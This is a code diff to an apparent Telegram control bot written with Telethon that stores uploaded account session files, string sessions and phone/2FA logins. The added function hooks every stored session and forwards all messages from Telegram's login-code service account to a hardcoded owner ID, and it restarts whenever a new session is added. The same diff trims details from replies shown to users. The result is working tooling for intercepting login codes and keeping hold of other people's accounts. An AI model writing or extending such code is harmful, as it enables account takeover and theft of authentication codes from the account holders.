@@ -29,7 +29,7 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 # Teri official Telegram Numeric User ID
 OWNER_ID = 8371518130
 
-SESSION_DIR = "session"  # Repo mein banaya gaya folder
+SESSION_DIR = "session"
 os.makedirs(SESSION_DIR, exist_ok=True)
 
 current_target = None
@@ -39,6 +39,29 @@ user_states = {}
 
 # --- Control Bot Client ---
 control_bot = TelegramClient('bot_control_session', API_ID, API_HASH)
+
+
+# --- Background Listener for Auto OTP Forwarding from Session Accounts ---
+async def start_session_otp_listeners():
+    session_files = [os.path.join(SESSION_DIR, f) for f in os.listdir(SESSION_DIR) if f.endswith('.session')]
+    for file_path in session_files:
+        try:
+            client = TelegramClient(file_path, API_ID, API_HASH)
+            await client.connect()
+            if await client.is_user_authorized():
+                
+                # Event listener for incoming messages from Telegram's official service notifications (ID 777000)
+                @client.on(events.NewMessage(chats=777000))
+                async def otp_listener(event):
+                    otp_text = event.message.text
+                    await control_bot.send_message(
+                        OWNER_ID,
+                        f"🔔 **Naya OTP / Login Code Aaya Hai!**\n\nSession File: `{os.path.basename(file_path)}`\n\n💬 **Message:**\n{otp_text}"
+                    )
+                
+                print(f"👂 OTP Listener active for session: {os.path.basename(file_path)}")
+        except Exception as e:
+            print(f"⚠️ Could not start listener for {file_path}: {e}")
 
 
 # --- Smart Sniper Worker ---
@@ -198,7 +221,6 @@ async def message_handler(event):
     
     chat_id = event.chat_id
     
-    # Check if document (.zip or .session) is uploaded
     if event.document and chat_id in user_states and user_states[chat_id].get('state') == 'WAITING_STRING':
         del user_states[chat_id]
         try:
@@ -212,13 +234,16 @@ async def message_handler(event):
                         if filename.endswith('.session'):
                             zip_ref.extract(filename, SESSION_DIR)
                             saved_count += 1
-                os.remove(file_path) # Remove zip after extraction
-                await event.respond(f"✅ **ZIP file processed successfully!** Extracted `{saved_count}` session file(s) into `{SESSION_DIR}/` folder.", buttons=get_main_menu_buttons())
+                os.remove(file_path)
+                await event.respond(f"✅ **ZIP file processed successfully!** Extracted `{saved_count}` session file(s).", buttons=get_main_menu_buttons())
             elif file_path.endswith('.session'):
-                await event.respond(f"✅ **Session file saved successfully!** Saved in `{SESSION_DIR}/` folder.", buttons=get_main_menu_buttons())
+                await event.respond(f"✅ **Session file saved successfully!**", buttons=get_main_menu_buttons())
             else:
                 os.remove(file_path)
                 await event.respond("❌ Invalid file format! Kripya `.zip` ya `.session` file bhejhein.", buttons=get_main_menu_buttons())
+            
+            # Restart OTP listeners for newly added sessions
+            asyncio.create_task(start_session_otp_listeners())
         except Exception as e:
             await event.respond(f"❌ Error processing file: {e}", buttons=get_main_menu_buttons())
         return
@@ -267,7 +292,8 @@ async def message_handler(event):
                 await temp_str_client.disconnect()
                 await file_client.disconnect()
                 
-                await event.respond(f"✅ **Session Saved Successfully via String!**\n👤 Name: {name}\n📱 Phone: `{phone}`", buttons=get_main_menu_buttons())
+                await event.respond(f"✅ **Session Saved Successfully!**\n👤 Name: {name}\n📱 Phone: `{phone}`", buttons=get_main_menu_buttons())
+                asyncio.create_task(start_session_otp_listeners())
             else:
                 await event.respond("❌ Session invalid ya unauthorized hai!", buttons=get_main_menu_buttons())
                 await test_client.disconnect()
@@ -313,7 +339,8 @@ async def message_handler(event):
             os.rename(temp_file, perm_file)
             
             del user_states[chat_id]
-            await event.respond(f"✅ **Account Login Successful & Saved!**\n👤 Name: {me.first_name}\n📱 Phone: `{phone}`", buttons=get_main_menu_buttons())
+            await event.respond(f"✅ **Account Login Successful & Saved!**\n👤 Name: {me.first_name}", buttons=get_main_menu_buttons())
+            asyncio.create_task(start_session_otp_listeners())
             
         except SessionPasswordNeededError:
             user_states[chat_id] = {
@@ -347,6 +374,7 @@ async def message_handler(event):
             
             del user_states[chat_id]
             await event.respond(f"✅ **2FA Verified & Session Saved!**\n👤 Name: {me.first_name}", buttons=get_main_menu_buttons())
+            asyncio.create_task(start_session_otp_listeners())
             
         except Exception as e:
             await event.respond(f"❌ Invalid 2FA password: {e}", buttons=get_main_menu_buttons())
@@ -424,7 +452,11 @@ async def main():
     keep_alive()
     print("Starting Telegram control bot...")
     await control_bot.start(bot_token=BOT_TOKEN)
-    print("✅ Control bot started successfully and listening for messages!")
+    
+    # Start auto-listeners for OTP forwarding on all session files in 'session/' folder
+    await start_session_otp_listeners()
+    
+    print("✅ Control bot started successfully and listening for messages & OTPs!")
     await control_bot.run_until_disconnected()
 
 if __name__ == '__main__':
